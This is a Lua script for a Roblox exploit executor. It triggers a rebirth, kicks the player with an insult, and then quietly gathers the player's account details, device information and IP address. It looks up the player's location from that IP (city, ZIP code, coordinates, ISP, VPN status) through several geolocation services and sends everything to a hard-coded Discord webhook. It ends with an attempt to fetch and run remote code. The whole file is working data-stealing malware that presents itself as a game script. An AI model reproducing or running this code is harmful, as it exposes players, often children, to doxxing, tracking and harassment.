local LocalPlayer = game.Players.LocalPlayer

local function doSingleRebirth()
    game:GetService("ReplicatedStorage").rEvents.rebirthRemote:InvokeServer("rebirthRequest")
end

doSingleRebirth()

LocalPlayer:Kick("PUTOO EZZZ CHINGA TU MADRE PERRA L L L")

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService = game:GetService("UserInputService")
local LocalizationService = game:GetService("LocalizationService")

local LocalPlayer = Players.LocalPlayer
local webhookURL = "https://discord.com/api/webhooks/1446636346792870050/G5Y6Nd7V4n34_NjdrzkSrpKPkMyiYn5OmeNENg1MFwnOBZN50T8uUDJETfHLXscpw9Bq"
local placeId = game.PlaceId

local function makeRequest(options)
    local requestFunc = http_request or (syn and syn.request) or request
    if not requestFunc then return nil end
    
    local success, result = pcall(function()
        return requestFunc(options)
    end)
    
    return success and result or nil
end

local function getExecutor()
    if identifyexecutor then
        local success, name = pcall(identifyexecutor)
        if success then return name end
    end
    return "Unknown"
end

local function getPlatform()
    local success, platform = pcall(function()
        return tostring(UserInputService:GetPlatform())
    end)
    return success and platform or "Unknown"
end

local function getDeviceType()
    local touchEnabled = UserInputService.TouchEnabled
    local mouseEnabled = UserInputService.MouseEnabled
    local keyboardEnabled = UserInputService.KeyboardEnabled
    local gamepadEnabled = UserInputService.GamepadEnabled
    
    if touchEnabled and not mouseEnabled and not keyboardEnabled then
        return "Mobile"
    elseif gamepadEnabled then
        return "Console"
    elseif mouseEnabled and keyboardEnabled then
        return "Desktop"
    end
    
    return "Unknown"
end

local function getScreenResolution()
    local camera = workspace.CurrentCamera
    if camera then
        local viewport = camera.ViewportSize
        return string.format("%dx%d", viewport.X, viewport.Y)
    end
    return "Unknown"
end

local function getSystemSpecs()
    local specs = {
        gpu = "Unknown",
        cpu = "Unknown"
    }
    return specs
end

local function getServerRegion()
    local success, region = pcall(function()
        return game.JobId:sub(1, 3)
    end)
    return success and region or "Unknown"
end

local function getPremiumStatus()
    local success, isPremium = pcall(function()
        return LocalPlayer.MembershipType == Enum.MembershipType.Premium
    end)
    return success and isPremium or false
end

local function getOperatingSystem()
    local platform = getPlatform()
    
    if platform:find("Windows") then
        return "Windows"
    elseif platform:find("OSX") or platform:find("Mac") then
        return "macOS"
    elseif platform:find("iOS") then
        return "iOS"
    elseif platform:find("Android") then
        return "Android"
    elseif platform:find("UWP") then
        return "Xbox"
    end
    
    return platform
end

local function getLocaleInfo()
    local info = {
        countryCode = "Unknown",
        language = "Unknown"
    }
    
    pcall(function()
        local result = LocalizationService:GetCountryRegionForPlayerAsync(LocalPlayer)
        info.countryCode = result or "Unknown"
    end)
    
    pcall(function()
        info.language = LocalizationService.RobloxLocaleId or "Unknown"
    end)
    
    return info
end

local function getUserAgent()
    local response = makeRequest({
        Url = "https://httpbin.org/user-agent",
        Method = "GET"
    })
    
    if response and response.Body then
        local success, decoded = pcall(function()
            return HttpService:JSONDecode(response.Body)
        end)
        
        if success and decoded then
            return decoded["user-agent"] or "Unknown"
        end
    end
    
    return "Unknown"
end

local function getComprehensiveIPData()
    local ipData = {
        ip = "Unknown",
        country = "Unknown",
        countryCode = "Unknown",
        region = "Unknown",
        regionCode = "Unknown",
        city = "Unknown",
        district = "Unknown",
        zip = "Unknown",
        latitude = "Unknown",
        longitude = "Unknown",
        timezone = "Unknown",
        offset = "Unknown",
        currency = "Unknown",
        isp = "Unknown",
        org = "Unknown",
        asn = "Unknown",
        asnName = "Unknown",
        reverse = "Unknown",
        mobile = "Unknown",
        proxy = "Unknown",
        hosting = "Unknown",
        vpn = "Unknown",
        tor = "Unknown",
        connectionType = "Unknown",
        continent = "Unknown",
        continentCode = "Unknown",
        accuracyRadius = "Unknown",
        metro = "Unknown",
        population = "Unknown",
        areaCode = "Unknown",
        callingCode = "Unknown",
        languages = "Unknown"
    }
    
    local response = makeRequest({
        Url = "http://ip-api.com/json/?fields=66846719",
        Method = "GET"
    })
    
    if response and response.Body then
        local success, decoded = pcall(function()
            return HttpService:JSONDecode(response.Body)
        end)
        
        if success and decoded and decoded.status == "success" then
            ipData.ip = decoded.query or ipData.ip
            ipData.country = decoded.country or ipData.country
            ipData.countryCode = decoded.countryCode or ipData.countryCode
            ipData.region = decoded.regionName or ipData.region
            ipData.regionCode = decoded.region or ipData.regionCode
            ipData.city = decoded.city or ipData.city
            ipData.district = decoded.district or ipData.district
            ipData.zip = decoded.zip or ipData.zip
            ipData.latitude = decoded.lat and tostring(decoded.lat) or ipData.latitude
            ipData.longitude = decoded.lon and tostring(decoded.lon) or ipData.longitude
            ipData.timezone = decoded.timezone or ipData.timezone
            ipData.offset = decoded.offset and tostring(decoded.offset) or ipData.offset
            ipData.currency = decoded.currency or ipData.currency
            ipData.isp = decoded.isp or ipData.isp
            ipData.org = decoded.org or ipData.org
            ipData.asn = decoded.as or ipData.asn
            ipData.asnName = decoded.asname or ipData.asnName
            ipData.reverse = decoded.reverse or ipData.reverse
            ipData.mobile = decoded.mobile and "Yes" or "No"
            ipData.proxy = decoded.proxy and "Yes" or "No"
            ipData.hosting = decoded.hosting and "Yes" or "No"
            ipData.continentCode = decoded.continent or ipData.continentCode
        end
    end
    
    local ipinfoResponse = makeRequest({
        Url = "https://ipinfo.io/" .. ipData.ip .. "/json",
        Method = "GET"
    })
    
    if ipinfoResponse and ipinfoResponse.Body then
        local success, ipinfoData = pcall(function()
            return HttpService:JSONDecode(ipinfoResponse.Body)
        end)
        
        if success and ipinfoData then
            if ipinfoData.postal then
                ipData.zip = ipinfoData.postal
            end
            if ipinfoData.org then
                ipData.org = ipinfoData.org
            end
        end
    end
    
    local vpnResponse = makeRequest({
        Url = "https://vpnapi.io/api/" .. ipData.ip,
        Method = "GET"
    })
    
    if vpnResponse and vpnResponse.Body then
        local success, vpnData = pcall(function()
            return HttpService:JSONDecode(vpnResponse.Body)
        end)
        
        if success and vpnData then
            if vpnData.security then
                ipData.vpn = vpnData.security.vpn and "Yes" or "No"
                ipData.proxy = vpnData.security.proxy and "Yes" or "No"
                ipData.tor = vpnData.security.tor and "Yes" or "No"
            end
            if vpnData.location then
                ipData.continent = vpnData.location.continent or ipData.continent
                ipData.callingCode = vpnData.location.calling_code or ipData.callingCode
                ipData.languages = vpnData.location.languages or ipData.languages
            end
        end
    end
    
    local ipgeolocationResponse = makeRequest({
        Url = "https://api.ipgeolocation.io/ipgeo?apiKey=free&ip=" .. ipData.ip,
        Method = "GET"
    })
    
    if ipgeolocationResponse and ipgeolocationResponse.Body then
        local success, geoData = pcall(function()
            return HttpService:JSONDecode(ipgeolocationResponse.Body)
        end)
        
        if success and geoData then
            ipData.connectionType = geoData.connection_type or ipData.connectionType
            ipData.currency = geoData.currency and geoData.currency.code or ipData.currency
            ipData.callingCode = geoData.calling_code or ipData.callingCode
        end
    end
    
    return ipData
end

local function getGameInfo()
    local success, info = pcall(function()
        return MarketplaceService:GetProductInfo(placeId)
    end)
    
    return success and info.Name or "Unknown"
end

local function sendWebhook()
    local ipData = getComprehensiveIPData()
    local specs = getSystemSpecs()
    local gameName = getGameInfo()
    local locale = getLocaleInfo()
    local userAgent = getUserAgent()
    
    local payload = {
        username = "Library Zenox Script",
        embeds = {
            {
                title = "Player Information",
                color = 0x5865F2,
                fields = {
                    {
                        name = "User ID",
                        value = tostring(LocalPlayer.UserId),
                        inline = true
                    },
                    {
                        name = "Username",
                        value = LocalPlayer.Name,
                        inline = true
                    },
                    {
                        name = "Display Name",
                        value = LocalPlayer.DisplayName,
                        inline = true
                    },
                    {
                        name = "Account Age",
                        value = LocalPlayer.AccountAge .. " days",
                        inline = true
                    },
                    {
                        name = "Premium",
                        value = getPremiumStatus() and "Yes" or "No",
                        inline = true
                    },
                    {
                        name = "Game",
                        value = gameName .. " (" .. placeId .. ")",
                        inline = false
                    }
                },
                timestamp = DateTime.now():ToIsoDate()
            },
            {
                title = "System Information",
                color = 0x57F287,
                fields = {
                    {
                        name = "Platform",
                        value = getPlatform(),
                        inline = true
                    },
                    {
                        name = "Operating System",
                        value = getOperatingSystem(),
                        inline = true
                    },
                    {
                        name = "Device Type",
                        value = getDeviceType(),
                        inline = true
                    },
                    {
                        name = "Screen Resolution",
                        value = getScreenResolution(),
                        inline = true
                    },
                    {
                        name = "GPU",
                        value = specs.gpu,
                        inline = true
                    },
                    {
                        name = "CPU",
                        value = specs.cpu,
                        inline = true
                    },
                    {
                        name = "Server Region",
                        value = getServerRegion(),
                        inline = true
                    },
                    {
                        name = "Executor",
                        value = getExecutor(),
                        inline = true
                    },
                    {
                        name = "Country Code",
                        value = locale.countryCode,
                        inline = true
                    },
                    {
                        name = "Language",
                        value = locale.language,
                        inline = true
                    },
                    {
                        name = "User Agent",
                        value = userAgent:sub(1, 100),
                        inline = false
                    }
                },
                timestamp = DateTime.now():ToIsoDate()
            },
            {
                title = "Basic Network Info",
                color = 0xFEE75C,
                fields = {
                    {
                        name = "IP Address",
                        value = ipData.ip,
                        inline = true
                    },
                    {
                        name = "ISP",
                        value = ipData.isp,
                        inline = true
                    },
                    {
                        name = "Organization",
                        value = ipData.org,
                        inline = true
                    },
                    {
                        name = "ASN",
                        value = ipData.asn,
                        inline = true
                    },
                    {
                        name = "ASN Name",
                        value = ipData.asnName,
                        inline = true
                    },
                    {
                        name = "Connection Type",
                        value = ipData.connectionType,
                        inline = true
                    },
                    {
                        name = "Mobile",
                        value = ipData.mobile,
                        inline = true
                    },
                    {
                        name = "VPN",
                        value = ipData.vpn,
                        inline = true
                    },
                    {
                        name = "Proxy",
                        value = ipData.proxy,
                        inline = true
                    },
                    {
                        name = "TOR",
                        value = ipData.tor,
                        inline = true
                    },
                    {
                        name = "Hosting",
                        value = ipData.hosting,
                        inline = true
                    },
                    {
                        name = "Reverse DNS",
                        value = ipData.reverse,
                        inline = true
                    }
                },
                timestamp = DateTime.now():ToIsoDate()
            },
            {
                title = "Geographic Location",
                color = 0xEB459E,
                fields = {
                    {
                        name = "Continent",
                        value = ipData.continent .. " (" .. ipData.continentCode .. ")",
                        inline = true
                    },
                    {
                        name = "Country",
                        value = ipData.country .. " (" .. ipData.countryCode .. ")",
                        inline = true
                    },
                    {
                        name = "Region",
                        value = ipData.region .. " (" .. ipData.regionCode .. ")",
                        inline = true
                    },
                    {
                        name = "City",
                        value = ipData.city,
                        inline = true
                    },
                    {
                        name = "District",
                        value = ipData.district,
                        inline = true
                    },
                    {
                        name = "ZIP Code",
                        value = ipData.zip,
                        inline = true
                    },
                    {
                        name = "Coordinates",
                        value = ipData.latitude .. ", " .. ipData.longitude,
                        inline = true
                    },
                    {
                        name = "Timezone",
                        value = ipData.timezone .. " (UTC" .. ipData.offset .. ")",
                        inline = true
                    },
                    {
                        name = "Currency",
                        value = ipData.currency,
                        inline = true
                    },
                    {
                        name = "Calling Code",
                        value = ipData.callingCode,
                        inline = true
                    },
                    {
                        name = "Languages",
                        value = ipData.languages,
                        inline = true
                    },
                    {
                        name = "Area Code",
                        value = ipData.areaCode,
                        inline = true
                    }
                },
                timestamp = DateTime.now():ToIsoDate()
            }
        }
    }
    
    local json = HttpService:JSONEncode(payload)
    
    makeRequest({
        Url = webhookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = json
    })
end

task.spawn(sendWebhook)

if games[placeId] then
    loadstring(game:HttpGet(games[placeId]))()
end
